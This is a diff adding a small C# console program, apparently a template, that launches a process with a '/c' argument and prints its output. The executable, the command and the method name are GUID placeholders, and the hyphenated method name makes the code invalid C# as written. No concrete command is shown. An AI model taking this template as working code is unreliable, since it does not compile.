@@ -1,0 +1,32 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Text;
+
+namespace WINTRE
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            fd98b648-6624-4461-abcf-5d1ad11a2839e();
+        }
+        static int fd98b648-6624-4461-abcf-5d1ad11a2839e()
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = "447912f6-0748-45b6-8b1e-4876333eeaf8";
+            process.StartInfo.Arguments = "/c 86c7c306-0c66-4919-9023-54cedcc0359f";
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            Console.WriteLine(output);
+            string err = process.StandardError.ReadToEnd();
+            Console.WriteLine(err);
+            process.WaitForExit();
+            return 0;
+        }
+    }
+}
